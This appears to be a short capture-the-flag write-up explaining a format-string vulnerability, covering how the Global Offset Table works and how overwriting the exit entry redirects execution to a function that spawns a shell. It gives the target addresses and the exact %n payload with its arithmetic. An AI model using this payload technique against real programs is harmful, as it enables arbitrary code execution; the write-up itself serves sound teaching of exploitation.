
# Vulnerability Summary

## What is GOT?

**GOT** (Global Offset Table) = A table where the program stores addresses of external functions.

When program calls `exit()`:
1. Goes to `exit@plt`
2. Reads real address from GOT
3. Jumps to that address

## The Problem

- Function `o` has `system("/bin/sh")` but is never called
- Function `n` uses `printf(buffer)` (vulnerable) then calls `exit()`

## The Solution: GOT Overwrite

Overwrite the GOT entry of `exit` with the address of `o`.

When program calls `exit()` → It jumps to `o()` instead → Shell!

## Key Addresses

| What | Address |
|------|---------|
| Function `o` | `0x080484a4` |
| GOT of exit | `0x8049838` |

## The Payload

```
[GOT address] + [%134513824x] + [%4$n]
```

| Part | Purpose |
|------|---------|
| `\x38\x98\x04\x08` | Where to write (GOT of exit) |
| `%134513824x` | Print 134513824 characters |
| `%4$n` | Write total count to address |

## Why 134513824?

- `0x080484a4` = 134513828 in decimal
- Minus 4 bytes (address) = 134513824
- `%n` writes how many characters were printed
- Total: 4 + 134513824 = 134513828 = `0x080484a4`

## Result

1. `printf` counts 134513828 characters
2. `%4$n` writes 134513828 to GOT of exit
3. Program calls `exit()`
4. GOT says "go to 0x080484a4"
5. Jumps to function `o`
6. `o` executes `system("/bin/sh")`
7. **Shell!**